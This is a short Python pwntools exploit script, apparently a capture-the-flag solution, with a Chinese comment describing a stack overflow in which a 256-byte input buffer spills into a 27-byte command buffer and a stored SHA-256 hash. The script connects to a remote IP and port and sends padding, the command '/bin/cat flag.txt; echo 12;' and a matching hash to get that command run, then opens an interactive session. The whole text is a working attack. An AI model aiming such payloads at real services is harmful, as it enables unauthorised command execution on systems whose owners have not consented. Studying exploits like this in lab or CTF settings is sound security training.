"""
漏洞点：栈溢出，导致任意命令执行
dest变量为256字节，存储用户输入，随后27字节栈空间用于存放待执行的命令，
随后的65字节保存dest变量的sha256哈希值
读取dest时，遇\0结束，存在溢出，可以控制命令和哈希值
"""

from pwn import *

p = remote("61.147.171.105", 59221)

# context.log_level = "debug"

cmd = b"/bin/cat flag.txt; echo 12;"  #必须为27字节，否则哈希值会被截断
payload = b"a" * 256 + cmd + b"02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe"

p.sendline(payload)

p.interactive()
